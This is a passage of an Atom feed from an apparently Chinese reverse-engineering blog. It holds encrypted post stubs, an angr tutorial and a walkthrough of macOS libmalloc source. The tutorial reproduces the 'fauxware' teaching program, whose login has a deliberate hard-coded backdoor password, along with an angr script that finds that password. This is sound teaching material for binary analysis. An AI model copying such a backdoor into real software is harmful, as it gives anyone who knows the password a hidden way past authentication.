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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
      <category term="auto.js" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/auto-js/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" 